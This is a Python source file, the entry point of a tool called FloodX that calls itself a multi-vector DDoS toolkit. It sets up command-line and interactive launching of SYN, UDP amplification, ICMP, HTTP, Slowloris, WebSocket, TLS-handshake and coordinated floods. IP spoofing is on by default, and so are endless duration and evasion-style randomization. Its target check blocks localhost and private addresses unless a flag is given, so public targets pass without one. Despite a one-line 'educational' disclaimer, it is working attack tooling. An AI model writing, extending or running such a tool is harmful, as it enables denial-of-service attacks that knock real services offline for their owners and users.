#!/usr/bin/env python3
"""
FloodX: Multi-Vector DDoS Toolkit - Unified Entry Point
Educational and authorized testing purposes only.
Single front door for both interactive TUI and CLI usage.
"""

import argparse
import asyncio
import sys
import signal
import os
from pathlib import Path
from typing import Dict, Any

from common.logger import logger
from common.colors import (
    create_colored_banner, Colors, Symbols, 
    success_text, warning_text, error_text, info_text, 
    accent_text, print_status
)
from common.logger import stats_logger
from orchestrator.dispatcher import AttackDispatcher
from orchestrator.interactive import FloodXTUI

# Global flag for graceful shutdown
shutdown_requested = False
signal_handler_active = False

def setup_signal_handlers():
    """Setup graceful shutdown signal handlers."""
    def signal_handler(signum, frame):
        global shutdown_requested, signal_handler_active
        
        # Prevent multiple signal handling
        if signal_handler_active:
            return
        
        signal_handler_active = True
        shutdown_requested = True
        
        try:
            # Stop real-time logging if active
            from common.logger import stats_logger
            if hasattr(stats_logger, 'is_running') and stats_logger.is_running:
                stats_logger.stop_real_time_logging()
                print()  # New line after real-time display
            
            print_status("Attack stopped by user (Ctrl+C). Generating final statistics...", "warning")
            
            # Display final statistics only if we have data
            if hasattr(stats_logger, 'stats') and stats_logger.stats.get('packets_sent', 0) > 0:
                stats_logger.update_stats(status='stopped_by_user')
                print(stats_logger.get_formatted_stats(final=True))
            
            print_status("Shutting down gracefully...", "info")
            
        except Exception as e:
            print(f"Error during shutdown: {e}")
        finally:
            # Force exit after cleanup
            sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)


def check_privileges():
    """Check if running with appropriate privileges."""
    if os.name == 'nt':  # Windows
        try:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            if not is_admin:
                print_status("Running without Administrator privileges. Some attacks may fail.", "warning")
                return False
        except:
            print_status("Could not determine privilege level.", "warning")
            return False
    else:  # Unix/Linux
        if os.geteuid() != 0:
            print_status("Running without root privileges. Some attacks may fail.", "warning")
            return False
    return True


def create_parser():
    """Create the main argument parser with subcommands."""
    parser = argparse.ArgumentParser(
        prog="floodx",
        description="FloodX Multi-Vector DDoS Toolkit",
        epilog="Use --interactive for full menu interface or subcommands for direct execution"
    )
    
    # Global flags
    parser.add_argument("--interactive", "-i", action="store_true",
                       help="Launch interactive TUI menu")
    parser.add_argument("--allow-private", action="store_true",
                       help="Allow targeting private/localhost addresses")
    parser.add_argument("--verbose", "-v", action="store_true",
                       help="Enable verbose logging")
    
    # Subcommands
    subparsers = parser.add_subparsers(dest="command", help="Available attack vectors")
    
    # SYN Flood
    syn_parser = subparsers.add_parser("syn", help="TCP SYN flood attack (continuous)")
    syn_parser.add_argument("--target", required=True, help="Target IP/hostname")
    syn_parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    syn_parser.add_argument("--threads", type=int, default=1000, help="Concurrent threads (default: 1000)")
    syn_parser.add_argument("--duration", type=int, default=0, help="Attack duration in seconds (0 = infinite, default: infinite)")
    syn_parser.add_argument("--spoof-ip", action="store_true", default=True, help="Enable IP spoofing (default: enabled)")
    syn_parser.add_argument("--allow-private", action="store_true", help="Allow targeting private/localhost addresses")
    
    # UDP Flood
    udp_parser = subparsers.add_parser("udp", help="UDP amplification attack (continuous)")
    udp_parser.add_argument("--target", required=True, help="Target IP/hostname")
    udp_parser.add_argument("--port", type=int, default=53, help="Target port (default: 53)")
    udp_parser.add_argument("--threads", type=int, default=500, help="Concurrent threads (default: 500)")
    udp_parser.add_argument("--duration", type=int, default=0, help="Attack duration in seconds (0 = infinite, default: infinite)")
    udp_parser.add_argument("--amplifier-type", choices=["dns", "ntp", "memcached"], default="dns",
                           help="Amplification service type (default: dns)")
    udp_parser.add_argument("--allow-private", action="store_true", help="Allow targeting private/localhost addresses")
    
    # ICMP Flood
    icmp_parser = subparsers.add_parser("icmp", help="ICMP flood attack (continuous)")
    icmp_parser.add_argument("--target", required=True, help="Target IP/hostname")
    icmp_parser.add_argument("--threads", type=int, default=100, help="Concurrent threads (default: 100)")
    icmp_parser.add_argument("--duration", type=int, default=0, help="Attack duration in seconds (0 = infinite, default: infinite)")
    icmp_parser.add_argument("--packet-size", type=int, default=64, help="ICMP packet size (default: 64)")
    icmp_parser.add_argument("--allow-private", action="store_true", help="Allow targeting private/localhost addresses")
    
    # HTTP Flood
    http_parser = subparsers.add_parser("http", help="HTTP flood attack (continuous)")
    http_parser.add_argument("--target", required=True, help="Target URL or IP")
    http_parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    http_parser.add_argument("--threads", type=int, default=200, help="Concurrent threads (default: 200)")
    http_parser.add_argument("--duration", type=int, default=0, help="Attack duration in seconds (0 = infinite, default: infinite)")
    http_parser.add_argument("--method", choices=["GET", "POST", "PUT", "DELETE"], default="GET",
                           help="HTTP method (default: GET)")
    http_parser.add_argument("--user-agents", action="store_true", default=True, help="Rotate user agents (default: enabled)")
    http_parser.add_argument("--allow-private", action="store_true", help="Allow targeting private/localhost addresses")
    
    # Slowloris
    slowloris_parser = subparsers.add_parser("slowloris", help="Slowloris attack (continuous)")
    slowloris_parser.add_argument("--target", required=True, help="Target IP/hostname")
    slowloris_parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    slowloris_parser.add_argument("--connections", type=int, default=200, help="Concurrent connections (default: 200)")
    slowloris_parser.add_argument("--duration", type=int, default=0, help="Attack duration in seconds (0 = infinite, default: infinite)")
    slowloris_parser.add_argument("--allow-private", action="store_true", help="Allow targeting private/localhost addresses")
    
    # WebSocket Storm
    ws_parser = subparsers.add_parser("websocket", help="WebSocket storm attack (continuous)")
    ws_parser.add_argument("--target", required=True, help="Target WebSocket URL")
    ws_parser.add_argument("--connections", type=int, default=100, help="Concurrent connections (default: 100)")
    ws_parser.add_argument("--duration", type=int, default=0, help="Attack duration in seconds (0 = infinite, default: infinite)")
    ws_parser.add_argument("--message-rate", type=int, default=10, help="Messages per second (default: 10)")
    ws_parser.add_argument("--allow-private", action="store_true", help="Allow targeting private/localhost addresses")
    
    # TLS Handshake Flood
    tls_parser = subparsers.add_parser("tls", help="TLS handshake flood attack (continuous)")
    tls_parser.add_argument("--target", required=True, help="Target IP/hostname")
    tls_parser.add_argument("--port", type=int, default=443, help="Target port (default: 443)")
    tls_parser.add_argument("--threads", type=int, default=100, help="Concurrent threads (default: 100)")
    tls_parser.add_argument("--duration", type=int, default=0, help="Attack duration in seconds (0 = infinite, default: infinite)")
    tls_parser.add_argument("--allow-private", action="store_true", help="Allow targeting private/localhost addresses")
    
    # Multi-Vector Attack
    multi_parser = subparsers.add_parser("multi", help="Multi-vector coordinated attack")
    multi_parser.add_argument("--target", required=True, help="Target IP/hostname")
    multi_parser.add_argument("--vectors", nargs="+", required=True,
                             choices=["syn", "udp", "icmp", "http", "tls"],
                             help="Attack vectors to combine")
    multi_parser.add_argument("--duration", type=int, default=120, help="Attack duration in seconds (default: 120)")
    multi_parser.add_argument("--intensity", choices=["light", "moderate", "full"], default="moderate",
                             help="Attack intensity profile (default: moderate)")
    multi_parser.add_argument("--allow-private", action="store_true", help="Allow targeting private/localhost addresses")
    
    # Continuous Attack Engine
    continuous_parser = subparsers.add_parser("continuous", help="Continuous attack with intelligent randomization")
    continuous_parser.add_argument("--target", required=True, help="Target IP/hostname")
    continuous_parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    continuous_parser.add_argument("--vector", choices=["syn", "http", "tls", "dns", "udp"], default="syn",
                                 help="Base attack vector (default: syn)")
    continuous_parser.add_argument("--duration", type=int, default=0, help="Duration in seconds (0 = infinite)")
    continuous_parser.add_argument("--concurrency", type=int, default=1000, help="Concurrent workers (default: 1000)")
    continuous_parser.add_argument("--spoof-ip", action="store_true", help="Enable IP spoofing with rotation")
    continuous_parser.add_argument("--randomization", choices=["low", "medium", "high"], default="high",
                                  help="Randomization level (default: high)")
    continuous_parser.add_argument("--restart-interval", type=int, default=30,
                                  help="Restart interval in seconds (default: 30)")
    continuous_parser.add_argument("--allow-private", action="store_true", help="Allow targeting private/localhost addresses")
    
    # Enhanced Multi-Vector Attack
    multi_enhanced_parser = subparsers.add_parser("multi-enhanced", help="Advanced multi-vector coordinated attack")
    multi_enhanced_parser.add_argument("--target", required=True, help="Target IP/hostname")
    multi_enhanced_parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    multi_enhanced_parser.add_argument("--vectors", nargs="+", 
                                      choices=["syn", "udp", "icmp", "http", "tls", "dns", "websocket", "slowloris", 
                                              "dns_amplification", "smtp", "teardrop", "smurf", "ping_of_death", "rudy"],
                                      default=["syn", "http", "tls", "dns"],
                                      help="Attack vectors to combine (default: syn http tls dns)")
    multi_enhanced_parser.add_argument("--duration", type=int, default=300, help="Duration in seconds (default: 300)")
    multi_enhanced_parser.add_argument("--concurrency", type=int, default=2000, help="Total concurrency (default: 2000)")
    multi_enhanced_parser.add_argument("--coordination", choices=["synchronized", "cascade", "adaptive"], default="adaptive",
                                      help="Coordination mode (default: adaptive)")
    multi_enhanced_parser.add_argument("--vector-rotation", action="store_true", default=True,
                                      help="Enable dynamic vector rotation")
    multi_enhanced_parser.add_argument("--dynamic-adjustment", action="store_true", default=True,
                                      help="Enable dynamic performance adjustment")
    multi_enhanced_parser.add_argument("--allow-private", action="store_true", help="Allow targeting private/localhost addresses")
    
    # Profile-based attack
    profile_parser = subparsers.add_parser("profile", help="Run attack from configuration file")
    profile_parser.add_argument("config_file", help="Path to YAML/JSON configuration file")
    profile_parser.add_argument("--dry-run", action="store_true", help="Validate config without executing")
    
    return parser


class FloodX:
    """Main FloodX application class."""
    
    def __init__(self):
        self.dispatcher = AttackDispatcher()
        self.running = False

    async def run_interactive(self):
        """Launch the interactive TUI."""
        logger.info("🚀 Starting FloodX Interactive Mode")
        tui = FloodXTUI(self)
        await tui.run()

    async def run_command(self, args):
        """Execute a command-line attack with enhanced status logging."""
        # Validate target
        target_host = self.extract_hostname_from_url(args.target)
        if not await self.validate_target(target_host, getattr(args, 'allow_private', False)):
            return

        # Build configuration from args
        config = self.build_config_from_args(args)
        
        # Log attack configuration
        logger.info(f"🎯 Attack Configuration:")
        logger.info(f"   Target: {config['target']}")
        logger.info(f"   Vector: {config['vector'].upper()}")
        logger.info(f"   Duration: {config['duration']}s")
        logger.info(f"   Concurrency: {config['concurrency']}")
        logger.info(f"   Port: {config['port']}")
        logger.info(f"   Allow Private: {config['allow_private']}")
        
        # Initialize stats logger
        from common.logger import stats_logger
        stats_logger.update_stats(
            target=config['target'],
            vector=config['vector'],
            status='starting'
        )
        
        # Execute attack with status monitoring
        try:
            logger.info(f"🚀 Launching {config['vector'].upper()} attack...")
            
            # Route to appropriate dispatcher based on command type
            if args.command == 'continuous':
                # Use continuous attack engine
                config['vector'] = 'continuous'
                await self.dispatcher.dispatch(config)
            elif args.command == 'multi-enhanced':
                # Use multi-vector coordinator
                await self.dispatcher.dispatch(config)
            elif args.command == 'multi':
                # Legacy multi-vector
                await self.dispatcher.dispatch(config)
            else:
                # Route all standard attacks through continuous engine for endless operation
                config['vector'] = 'continuous'
                await self.dispatcher.dispatch(config)
                
        except KeyboardInterrupt:
            logger.info("🛑 Attack interrupted by user")
            if hasattr(stats_logger, 'update_stats'):
                stats_logger.update_stats(status='interrupted')
        except Exception as e:
            logger.error(f"❌ Attack execution failed: {e}")
            if hasattr(stats_logger, 'update_stats'):
                stats_logger.update_stats(status='failed')
        finally:
            # Display final statistics
            if hasattr(stats_logger, 'get_formatted_stats'):
                logger.info(stats_logger.get_formatted_stats())

    def extract_hostname_from_url(self, target: str) -> str:
        """Extract hostname/IP from URL or return as-is if it's already a hostname/IP."""
        import re
        
        # If it looks like a URL, extract the hostname
        if '://' in target:
            # Parse URL to extract hostname
            match = re.match(r'https?://([^:/]+)', target)
            if match:
                return match.group(1)
        
        # If it's just a hostname/IP, return as-is
        return target

    def build_config_from_args(self, args) -> Dict[str, Any]:
        """Build attack configuration from command line arguments."""
        # Extract port from URL if not explicitly provided
        target_port = self.extract_port_from_url(args.target) if '://' in args.target else None
        config_port = target_port if target_port else getattr(args, 'port', 80)
        
        config = {
            'target': args.target,
            'vector': args.command,
            'duration': getattr(args, 'duration', 0),  # Default to infinite
            'concurrency': getattr(args, 'threads', getattr(args, 'connections', 100)),
            'port': config_port,
            'spoof_ip': getattr(args, 'spoof_ip', True),  # Enable by default
            'advanced': True,
            'allow_private': getattr(args, 'allow_private', False),
            'continuous': True,  # Enable continuous mode for all attacks
            'restart_interval': 30,  # Default restart interval
            'randomization_level': 'high'  # High randomization by default
        }
        
        # Add vector-specific parameters
        if args.command == 'udp':
            config['amplifier_type'] = getattr(args, 'amplifier_type', 'dns')
        elif args.command == 'icmp':
            config['packet_size'] = getattr(args, 'packet_size', 64)
        elif args.command == 'http':
            config['method'] = getattr(args, 'method', 'GET')
            config['user_agents'] = getattr(args, 'user_agents', True)  # Enable by default
            config['header_randomization'] = True
        elif args.command == 'websocket':
            config['message_rate'] = getattr(args, 'message_rate', 10)
        elif args.command == 'tls':
            # Enhanced TLS configuration
            config['expensive_ciphers'] = True
            config['connection_pooling'] = True
        elif args.command == 'multi':
            config['vectors'] = args.vectors
            config['intensity'] = args.intensity
        elif args.command == 'continuous':
            config['vector'] = args.vector
            config['restart_interval'] = args.restart_interval
            config['randomization_level'] = args.randomization
        elif args.command == 'multi-enhanced':
            config['vector'] = 'multi_vector'
            config['vectors'] = args.vectors
            config['coordination_mode'] = args.coordination
            config['vector_rotation'] = args.vector_rotation
            config['dynamic_adjustment'] = args.dynamic_adjustment
            config['concurrency'] = args.concurrency
        
        return config

    def extract_port_from_url(self, url: str) -> int:
        """Extract port from URL."""
        import re
        
        # Match URL with explicit port
        match = re.match(r'https?://[^:/]+:(\d+)', url)
        if match:
            return int(match.group(1))
        
        # Default ports based on scheme
        if url.startswith('https://'):
            return 443
        elif url.startswith('http://'):
            return 80
        
        return None

    async def run_profile(self, config_file: str, dry_run: bool = False):
        """Run attack from configuration file."""
        import yaml
        import json
        
        config_path = Path(config_file)
        if not config_path.exists():
            logger.error(f"❌ Config file not found: {config_file}")
            return
        
        try:
            with open(config_path, 'r') as f:
                if config_path.suffix.lower() in ['.yaml', '.yml']:
                    config = yaml.safe_load(f)
                else:
                    config = json.load(f)
            
            if dry_run:
                logger.info("🔍 DRY RUN MODE - Validating configuration")
                if await self.dispatcher.validate_config(config):
                    logger.info("✅ Configuration is valid")
                else:
                    logger.error("❌ Configuration validation failed")
                return
            
            await self.dispatcher.dispatch(config)
            
        except Exception as e:
            logger.error(f"❌ Failed to load/execute config: {e}")

    async def validate_target(self, target: str, allow_private: bool = False) -> bool:
        """Validate target IP/hostname with safety checks."""
        import ipaddress
        import re
        
        try:
            # Extract hostname from URL if needed
            hostname = self.extract_hostname_from_url(target)
            
            # Try to resolve as IP first
            try:
                ip = ipaddress.ip_address(hostname)
                
                # Safety checks
                if ip.is_loopback:
                    if not allow_private:
                        logger.error("❌ Localhost targets not allowed. Use --allow-private to override.")
                        return False
                    logger.warning("⚠️  Targeting localhost - authorized testing only!")
                
                if ip.is_private and not allow_private:
                    logger.error("❌ Private network targets not allowed. Use --allow-private to override.")
                    return False
                    
            except ValueError:
                # It's a hostname, validate it's not localhost variants
                localhost_variants = ['localhost', '127.0.0.1', '::1', 'local', '0.0.0.0']
                if hostname.lower() in localhost_variants and not allow_private:
                    logger.error("❌ Localhost targets not allowed. Use --allow-private to override.")
                    return False
                
                # Check if hostname resolves to private IP
                if not allow_private:
                    try:
                        import socket
                        resolved_ip = socket.gethostbyname(hostname)
                        ip = ipaddress.ip_address(resolved_ip)
                        if ip.is_private or ip.is_loopback:
                            logger.error("❌ Target resolves to private/localhost IP. Use --allow-private to override.")
                            return False
                    except socket.gaierror:
                        logger.warning(f"⚠️  Cannot resolve hostname: {hostname}")
            
            logger.info(f"✅ Target validation passed: {target}")
            return True
            
        except Exception as e:
            logger.error(f"❌ Target validation failed: {e}")
            return False


async def main():
    """Main entry point for FloodX."""
    # Setup signal handlers
    setup_signal_handlers()
    
    # Check privileges
    check_privileges()
    
    # Parse arguments
    parser = create_parser()
    args = parser.parse_args()
    
    # Setup logging
    if getattr(args, 'verbose', False):
        import logging
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Create FloodX instance
    floodx = FloodX()
    
    try:
        if args.interactive:
            # Launch interactive TUI
            await floodx.run_interactive()
        elif args.command:
            if args.command == 'profile':
                # Run from config file
                await floodx.run_profile(args.config_file, getattr(args, 'dry_run', False))
            else:
                # Execute specific command
                await floodx.run_command(args)
        else:
            # No command specified, show help
            parser.print_help()
            print("\n💡 Use --interactive for the full TUI experience!")
            print("💡 Use --allow-private to target localhost/private networks for testing!")
            print("💡 All attacks now run continuously by default (duration 0 = infinite)!")
            print("💡 Examples:")
            print("   python main.py syn --target localhost --allow-private --duration 0  # Endless SYN flood")
            print("   python main.py http --target http://localhost:8080 --allow-private    # Endless HTTP flood")
            print("   python main.py tls --target localhost --port 443 --allow-private     # Endless TLS flood")
            print("   python main.py multi-enhanced --target localhost --allow-private     # Multi-vector endless")
            print("   python main.py --interactive")
            
    except KeyboardInterrupt:
        logger.info("👋 FloodX interrupted by user!")
    except Exception as e:
        logger.error(f"❌ FloodX error: {e}")
        if getattr(args, 'verbose', False):
            import traceback
            traceback.print_exc()


if __name__ == "__main__":
    # Display colored banner
    print(create_colored_banner())
    
    # Run the application
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{success_text('🛑 FloodX terminated. Stay safe!')}")
    except Exception as e:
        print(f"{error_text('❌ Fatal error:')} {error_text(str(e))}")
        sys.exit(1)
